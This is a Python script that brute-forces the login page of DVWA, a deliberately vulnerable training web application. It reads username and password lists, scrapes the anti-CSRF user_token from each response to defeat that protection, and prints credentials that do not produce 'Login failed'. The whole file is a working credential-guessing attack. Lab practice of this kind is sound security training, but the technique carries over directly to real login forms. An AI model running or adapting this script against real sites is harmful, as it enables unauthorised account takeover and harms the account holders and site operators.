#!/usr/bin/python3

import requests
from bs4 import BeautifulSoup

url = 'http://dvwa/vulnerabilities/brute/'
cookies = {'PHPSESSID':'6sgavn49qbmd9isjqg023487s1', 'security':'low'}
payload = {'username':'test','password':'test','user_token':'d316aad5fb9802e1a7d36bbeff75cf65'}
response = requests.post(url, data=payload ,cookies=cookies)
soup = BeautifulSoup(response.text, 'html.parser')
val = soup.input['user_token']
with open('users.txt','r') as file1:
        usersWithNewLine = file1.readlines()
        for user in usersWithNewLine:
                userWithoutNewLine = user.split("\n")
                with open('passwords.txt','r') as file2:
                        passwordsWithNewLine = file2.readlines()
                        for password in passwordsWithNewLine:
                                passwordWithoutNewLine = password.split("\n")
                                #print(userWithoutNewLine[0]+":"+passwordWithoutNewLine[0])
                                payload = {'username':userWithoutNewLine[0],'password':passwordWithoutNewLine[0],'user_token':val}
                                response = requests.post(url, data=payload ,cookies=cookies)
                                soup = BeautifulSoup(response.text, 'html.parser')
                                val = soup.input['user_token']
                                if 'Login failed' not in response.text:
                                        print(userWithoutNewLine[0]+":"+passwordWithoutNewLine[0]+" are the correct creds!!")
                                else:
                                        continue


